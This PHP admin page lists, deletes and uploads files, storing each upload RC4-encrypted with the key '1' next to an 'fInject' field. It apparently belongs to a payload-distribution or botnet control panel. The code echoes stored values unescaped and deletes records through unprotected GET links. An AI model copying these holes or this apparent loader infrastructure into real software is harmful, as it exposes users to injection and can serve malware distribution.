<?php

echo "<div style='padding: 20px'><div style='margin-bottom: 20px'>
    <a	class='razdel' href='?act=files'>All list</a>
    <a	class='razdel' href='?act=files&add'>Add</a>
    </div>";

if (isset($_GET['del']))
{
    $id = (int)$_GET['del'];

    $db->query("DELETE FROM `files` WHERE fId={$id}");
}

if (!isset($_GET['add']))
{
    $files = $db->query('SELECT * FROM `files`')->fetchAllAssoc();

    echo "<table cellpadding='3' cellspacing='3' width='100%' style=''><tr><td width='100%'>";

    echo "<table cellpadding='3' cellspacing='0' width='100%' class='light_table box' rules='all'>
    <tr><th>Num</th><th>Name</th><th>Version</th><th>Added</th><th>Path</th><th>Action</th></tr>";

    $count = 0;

    foreach ($files as $file)
    {
        $color = $count % 2 ? "#d3e7f0" : "#ebf4f8";

        echo "<tr bgcolor='$color' onmouseover=\"this.style.background='#ffffff'\" onmouseout=\"this.style.background='$color'\">
        <td align='center'><b>{$file['fId']}</b></td>
        <td align='center'>{$file['fName']}</td>
        <td align='center'>{$file['fVer']}</td>
        <td align='center'>{$file['fDate']}</td>
        <td align='center'>{$file['fFilePath']}</td>
        <td align='center'><a href='?act=files&del=".$file['fId']."'>Delete</a></td>
        </tr>";

        $count++;
    }
}
else
{
    echo "<form action='?act=files&add' method='post' enctype='multipart/form-data'>
        <table cellpadding='3' cellspacing='3' width='100%'>
        <tr>
            <td class='td_col_zag' width='30%'>Name</td>
            <td class='td_col_list' width='70%'>
                <input name='fName' type='text' value=''>
            </td>
        </tr>
        <tr>
            <td class='td_col_zag' width='30%'>Version</td>
            <td class='td_col_list' width='70%'>
                <input name='fVer' type='text' value=''>
            </td>
        </tr>
        <tr>
            <td class='td_col_zag' width='30%'>File</td>
            <td class='td_col_list' width='70%'>
                <input type='file' name='fFile'>
            </td>
        </tr>
        <tr>
            <td>&nbsp;</td>
            <td><input type='submit' value='Add' name='fAdd'></td>
        </tr>
        </table>
        </form>";

    if (isset($_POST['fAdd']))
    {
        $newname = './files/'.randstr(30);
        $ctx = file_get_contents($_FILES['fFile']['tmp_name']);

        if ($fh = fopen($newname, "w+"))
        {
            if (fwrite($fh, RC4($ctx, "1")))
            {
                $file = array
                (
                    'fName' => $_POST['fName'],
                    'fVer' => $_POST['fVer'],
                    'fInject' => "",
                    'fFilePath' => $newname,
                    'fDate' => date('Y-m-d H:i:s', strtotime('now')),
                );

                if ($db->insert('files', $file)) metaRefresh('?act=files');
            }
            else echo "Error while write file";

            fclose($fh);
        }
        else echo "Error while open file";
    }
}

?>
